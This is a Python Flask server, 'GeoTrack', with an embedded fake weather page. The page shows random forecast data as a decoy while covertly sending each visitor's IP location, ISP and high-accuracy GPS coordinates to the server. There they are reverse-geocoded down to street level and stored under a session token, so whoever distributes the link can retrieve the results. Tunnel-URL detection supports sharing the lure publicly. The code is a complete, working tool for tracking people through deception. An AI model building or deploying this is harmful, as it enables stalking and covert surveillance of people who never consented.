"""
GeoTrack Backend — Fixed Version
Fixes:
  1. Localhost IP → public IP fallback via ipify
  2. Proper static file serving for all HTML/CSS/JS
  3. Better error handling + debug prints
  4. ngrok URL detection improved

Run:
  pip install flask flask-cors requests
  python server.py
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests, threading, time, uuid, os

# ── APP SETUP ──────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, static_folder=BASE_DIR, static_url_path='')
CORS(app, origins="*")

# Session store
sessions = {}
SESSION_TTL = 30 * 60  # 30 min

def cleanup_loop():
    while True:
        time.sleep(60)
        now = time.time()
        dead = [t for t, s in list(sessions.items()) if now - s["last_seen"] > SESSION_TTL]
        for t in dead:
            del sessions[t]

threading.Thread(target=cleanup_loop, daemon=True).start()


# ── GET PUBLIC IP (fixes localhost issue) ──────────────
def get_public_ip():
    """When running locally, 127.0.0.1 won't work with ip-api.
       This fetches the actual public IP."""
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip")
    except:
        try:
            r = requests.get("https://api64.ipify.org?format=json", timeout=5)
            return r.json().get("ip")
        except:
            return None


# ── IP INFO ────────────────────────────────────────────
def get_ip_info(ip=None):
    try:
        fields = "status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,query"
        if ip:
            url = f"http://ip-api.com/json/{ip}?fields={fields}"
        else:
            url = f"http://ip-api.com/json/?fields={fields}"

        d = requests.get(url, timeout=8).json()
        print(f"[IP-API] {ip or 'self'} → status={d.get('status')} city={d.get('city')}")

        if d.get("status") == "success":
            return {
                "status":       "success",
                "ip":           d.get("query", ""),
                "city":         d.get("city", ""),
                "region":       d.get("regionName", ""),
                "country":      d.get("country", ""),
                "country_code": d.get("countryCode", ""),
                "lat":          d.get("lat"),
                "lon":          d.get("lon"),
                "isp":          d.get("isp", ""),
                "org":          d.get("org", ""),
                "timezone":     d.get("timezone", ""),
                "zip":          d.get("zip", "")
            }
        return {"status": "fail", "message": d.get("message", "failed")}
    except Exception as e:
        print(f"[IP-API ERROR] {e}")
        return {"status": "fail", "message": str(e)}


# ── REVERSE GEOCODE (OSM Nominatim) ───────────────────
def reverse_geocode(lat, lon):
    try:
        r = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={
                "lat": lat, "lon": lon,
                "format": "json", "zoom": 18,
                "addressdetails": 1
            },
            headers={"User-Agent": "GeoTrack/2.0 (educational project)"},
            timeout=10
        )
        d = r.json()
        a = d.get("address", {})
        print(f"[NOMINATIM] {lat},{lon} → {d.get('display_name','?')[:60]}")

        city = (
            a.get("city") or a.get("town") or a.get("village") or
            a.get("suburb") or a.get("neighbourhood") or a.get("quarter") or
            a.get("hamlet") or a.get("county") or a.get("municipality") or "Unknown"
        )
        road = (
            a.get("road") or a.get("pedestrian") or a.get("footway") or
            a.get("path") or a.get("cycleway") or ""
        )
        house = a.get("house_number", "")
        full_road = (house + " " + road).strip() if house else road

        return {
            "city":         city,
            "suburb":       a.get("suburb", "") or a.get("neighbourhood", ""),
            "state":        a.get("state", ""),
            "state_district": a.get("state_district", ""),
            "country":      a.get("country", ""),
            "country_code": a.get("country_code", "").upper(),
            "postcode":     a.get("postcode", ""),
            "road":         full_road,
            "display":      d.get("display_name", ""),
        }
    except Exception as e:
        print(f"[NOMINATIM ERROR] {e}")
        return {"city": "Unknown", "state": "", "country": "", "road": "", "error": str(e)}


# ══════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════

# ── Static HTML pages ─────────────────────────────────
@app.route("/")
def home():
    return send_from_directory(BASE_DIR, "index.html")

@app.route("/<page>.html")
def serve_page(page):
    fname = page + ".html"
    fpath = os.path.join(BASE_DIR, fname)
    if os.path.exists(fpath):
        return send_from_directory(BASE_DIR, fname)
    return "Page not found", 404

# ── API: My IP (fixes localhost → fetches public IP) ──
@app.route("/api/ip")
def api_my_ip():
    fwd = request.headers.get("X-Forwarded-For", "")
    ip  = fwd.split(",")[0].strip() if fwd else request.remote_addr

    # Localhost → get real public IP
    if ip in ("127.0.0.1", "::1", "localhost"):
        print("[IP] Localhost detected — fetching public IP...")
        ip = get_public_ip()
        print(f"[IP] Public IP = {ip}")

    result = get_ip_info(ip)
    return jsonify(result)

# ── API: Lookup any IP ─────────────────────────────────
@app.route("/api/ip/<path:ip>")
def api_ip_lookup(ip):
    ip = ip.strip()
    result = get_ip_info(ip)
    return jsonify(result)

# ── API: Reverse Geocode ───────────────────────────────
@app.route("/api/reverse")
def api_reverse():
    lat = request.args.get("lat")
    lon = request.args.get("lon") or request.args.get("lng")
    if not lat or not lon:
        return jsonify({"error": "lat and lon required"}), 400
    return jsonify(reverse_geocode(float(lat), float(lon)))

# ── API: ngrok URL ─────────────────────────────────────
@app.route("/api/ngrok-url")
def api_ngrok_url():
    # Try to detect ngrok URL automatically
    ngrok_url = None
    try:
        # ngrok local API
        r = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        tunnels = r.json().get("tunnels", [])
        for t in tunnels:
            if t.get("proto") == "https":
                ngrok_url = t["public_url"]
                break
        if not ngrok_url and tunnels:
            ngrok_url = tunnels[0]["public_url"]
    except:
        pass

    if ngrok_url:
        print(f"[NGROK] Detected: {ngrok_url}")
        return jsonify({"url": ngrok_url, "source": "auto-detected"})

    # Fallback: use current request host
    host = request.host_url.rstrip("/")
    print(f"[NGROK] Not detected, using host: {host}")
    return jsonify({"url": host, "source": "host"})

# ── API: Create Session ────────────────────────────────
@app.route("/api/session")
def api_session():
    token = uuid.uuid4().hex
    sessions[token] = {"captures": [], "last_seen": time.time()}
    print(f"[SESSION] Created: {token[:8]}...")
    return jsonify({"token": token})

# ── API: Submit Capture ────────────────────────────────
@app.route("/api/capture", methods=["POST"])
def api_capture():
    data  = request.get_json(force=True) or {}
    token = data.pop("token", "")

    fwd = request.headers.get("X-Forwarded-For", "")
    raw_ip = fwd.split(",")[0].strip() if fwd else request.remote_addr
    if raw_ip in ("127.0.0.1", "::1"):
        raw_ip = get_public_ip() or raw_ip
    data["captured_ip"] = raw_ip
    data["timestamp"]   = time.strftime("%Y-%m-%d %H:%M:%S")

    # Reverse geocode GPS coordinates
    lat = data.get("lat")
    lon = data.get("lon") or data.get("lng")
    if lat and lon:
        geo = reverse_geocode(float(lat), float(lon))
        data.update({
            "city":    geo.get("city", ""),
            "suburb":  geo.get("suburb", ""),
            "state":   geo.get("state", ""),
            "country": geo.get("country", ""),
            "road":    geo.get("road", ""),
        })

    # IP info fallback
    if not data.get("isp") and data.get("captured_ip"):
        ip_info = get_ip_info(data["captured_ip"])
        if ip_info.get("status") == "success":
            data["isp"] = ip_info.get("isp", "")
            data["org"] = ip_info.get("org", "")
            if not data.get("city"):
                data["city"]    = ip_info.get("city", "")
                data["country"] = ip_info.get("country", "")

    # Save to session
    if token and token in sessions:
        sessions[token]["captures"].append(data)
        sessions[token]["last_seen"] = time.time()
        num = len(sessions[token]["captures"])
    else:
        num = 0
        print(f"[CAPTURE] Warning: token '{token[:8]}...' not found in sessions")

    print(f"[CAPTURE #{num}] {data['timestamp']} | {data.get('method','?').upper()} | "
          f"{data.get('city','?')}, {data.get('country','?')} | IP={data.get('captured_ip','?')}")
    return jsonify({"status": "ok", "captured": num})

# ── API: Get Captures ──────────────────────────────────
@app.route("/api/captures")
def api_captures():
    token = request.args.get("token", "")
    if not token or token not in sessions:
        return jsonify([])
    sessions[token]["last_seen"] = time.time()
    caps = sessions[token]["captures"]
    print(f"[CAPTURES] Token {token[:8]}... → {len(caps)} captures")
    return jsonify(caps)

# ── API: Health check ──────────────────────────────────
@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "sessions": len(sessions)})

# ── Fake Weather Page ──────────────────────────────────
FAKE_WEATHER_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeatherNow — Live Local Forecast</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(160deg,#0f2b5b,#1a4080 40%,#0a1a3a);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:1.5rem 1rem 3rem}
header{width:100%;max-width:500px;display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
.brand{font-weight:700;font-size:1rem;color:#fff;letter-spacing:1px}.brand span{color:#60b4ff}
nav a{color:rgba(255,255,255,.5);text-decoration:none;font-size:.8rem;margin-left:1.2rem}
.card{background:rgba(255,255,255,.1);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,.18);border-radius:28px;padding:2.5rem 2.5rem 2rem;max-width:440px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5)}
.loading{display:flex;flex-direction:column;align-items:center;gap:1.2rem;padding:2rem 0}
.spinner{width:44px;height:44px;border:3px solid rgba(255,255,255,.2);border-top-color:#60b4ff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.load-txt{color:rgba(255,255,255,.6);font-size:.9rem}
#wc{display:none;text-align:center}
.city{font-size:1.9rem;font-weight:700;margin-bottom:.2rem}
.country{font-size:.9rem;color:rgba(255,255,255,.6);margin-bottom:1.8rem}
.wicon{font-size:5.5rem;line-height:1;margin:.5rem 0}
.temp{font-size:5rem;font-weight:200;line-height:1}
.temp sup{font-size:1.8rem;vertical-align:top;margin-top:1rem;font-weight:400}
.cond{font-size:1.1rem;color:rgba(255,255,255,.75);margin:.8rem 0 2rem}
.details{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;border-top:1px solid rgba(255,255,255,.12);padding-top:1.5rem}
.di{text-align:center}.dv{font-size:1.15rem;font-weight:600}
.dl{font-size:.65rem;color:rgba(255,255,255,.5);letter-spacing:1.5px;margin-top:.3rem;text-transform:uppercase}
.fc{display:flex;justify-content:space-between;margin-top:1.8rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.1)}
.fd{text-align:center;font-size:.75rem;color:rgba(255,255,255,.6)}.fi{font-size:1.3rem;margin:.3rem 0}.ft{font-size:.85rem;font-weight:600;color:#fff}
.upd{font-size:.7rem;color:rgba(255,255,255,.35);margin-top:1.5rem;text-align:center}
</style>
</head>
<body>
<header>
  <div class="brand">🌤 Weather<span>Now</span></div>
  <nav><a href="#">Forecast</a><a href="#">Radar</a><a href="#">Maps</a></nav>
</header>
<div class="card">
  <div class="loading" id="ld">
    <div class="spinner"></div>
    <div class="load-txt" id="lt">Detecting your location...</div>
  </div>
  <div id="wc">
    <div class="city" id="cn">—</div>
    <div class="country" id="co">—</div>
    <div class="wicon" id="wi">⛅</div>
    <div class="temp"><span id="wt">--</span><sup>°C</sup></div>
    <div class="cond" id="wc2">Partly cloudy</div>
    <div class="details">
      <div class="di"><div class="dv" id="wh">—</div><div class="dl">Humidity</div></div>
      <div class="di"><div class="dv" id="ww">—</div><div class="dl">Wind</div></div>
      <div class="di"><div class="dv" id="wf">—</div><div class="dl">Feels Like</div></div>
    </div>
    <div class="fc" id="fc"></div>
    <div class="upd" id="upd">Updating...</div>
  </div>
</div>
<script>
var S = window.location.origin;
var tkn = new URLSearchParams(window.location.search).get('t') || '';
var ic  = ['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫'];
var cd  = ['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky'];
var dys = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
function rn(a,b){return Math.floor(Math.random()*(b-a))+a;}
function ri(a){return a[Math.floor(Math.random()*a.length)];}
function showWeather(city, country) {
  document.getElementById('ld').style.display = 'none';
  document.getElementById('wc').style.display = 'block';
  document.getElementById('cn').textContent = city || 'Your Location';
  document.getElementById('co').textContent = country || '';
  document.getElementById('wi').textContent = ri(ic);
  var t = rn(10,40);
  document.getElementById('wt').textContent = t;
  document.getElementById('wf').textContent = (t - rn(1,5)) + '°C';
  document.getElementById('wc2').textContent = ri(cd);
  document.getElementById('wh').textContent = rn(35,90) + '%';
  document.getElementById('ww').textContent = rn(5,35) + ' km/h';
  document.getElementById('upd').textContent = 'Last updated: ' + new Date().toLocaleTimeString();
  var fc = document.getElementById('fc'), today = new Date();
  fc.innerHTML = '';
  for (var i = 1; i <= 5; i++) {
    var d = new Date(today); d.setDate(today.getDate() + i);
    var hi = rn(12,42), lo = hi - rn(3,9);
    fc.innerHTML += '<div class="fd"><div>' + dys[d.getDay()] + '</div><div class="fi">' + ri(ic.slice(0,5)) + '</div><div class="ft">' + hi + '°/' + lo + '°</div></div>';
  }
}
function cap(data) {
  data.token = tkn;
  fetch(S + '/api/capture', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(data)
  }).catch(function(){});
}
function localTime() {
  return new Date().toLocaleString('en-IN', {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:true});
}
// Step 1: Show weather with IP-based location first
fetch(S + '/api/ip').then(function(r){return r.json();}).then(function(d){
  if (d.status === 'success' && d.city) {
    showWeather(d.city, d.country);
    cap({method:'ip', lat:d.lat, lon:d.lon, city:d.city, country:d.country, isp:d.isp, client_time:localTime()});
  }
}).catch(function(){});
// Step 2: GPS (more accurate — overrides IP result if granted)
if (navigator.geolocation) {
  var best = {acc: Infinity, lat: null, lon: null};
  var gpsDone = false;
  var wid = navigator.geolocation.watchPosition(
    function(p) {
      if (gpsDone) return;
      var lat = p.coords.latitude, lon = p.coords.longitude, acc = p.coords.accuracy;
      if (acc < best.acc) { best = {acc:acc, lat:lat, lon:lon}; }
      if (acc < 50 || best.lat !== null) {
        gpsDone = true;
        navigator.geolocation.clearWatch(wid);
        // Get city name from reverse geocode
        fetch(S + '/api/reverse?lat=' + lat + '&lon=' + lon).then(function(r){return r.json();}).then(function(geo){
          if (geo.city) showWeather(geo.city, geo.country);
          cap({method:'gps', lat:lat, lon:lon, city:geo.city, state:geo.state, country:geo.country, road:geo.road, accuracy:Math.round(acc), client_time:localTime()});
        }).catch(function(){
          cap({method:'gps', lat:lat, lon:lon, accuracy:Math.round(acc), client_time:localTime()});
        });
      }
    },
    function(){}, {enableHighAccuracy:true, timeout:15000, maximumAge:0}
  );
  setTimeout(function(){
    if (!gpsDone && best.lat !== null) {
      gpsDone = true;
      navigator.geolocation.clearWatch(wid);
      cap({method:'gps', lat:best.lat, lon:best.lon, accuracy:Math.round(best.acc), client_time:localTime()});
    }
  }, 12000);
}
</script>
</body>
</html>"""

@app.route("/forecast/world")
@app.route("/weather")
def fake_weather():
    return FAKE_WEATHER_HTML


# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("\n" + "="*55)
    print(f"  GeoTrack Server v2.0")
    print(f"  URL  : http://localhost:{port}")
    print(f"  Test : http://localhost:{port}/api/health")
    print("="*55 + "\n")
    app.run(host="0.0.0.0", port=port, debug=True)
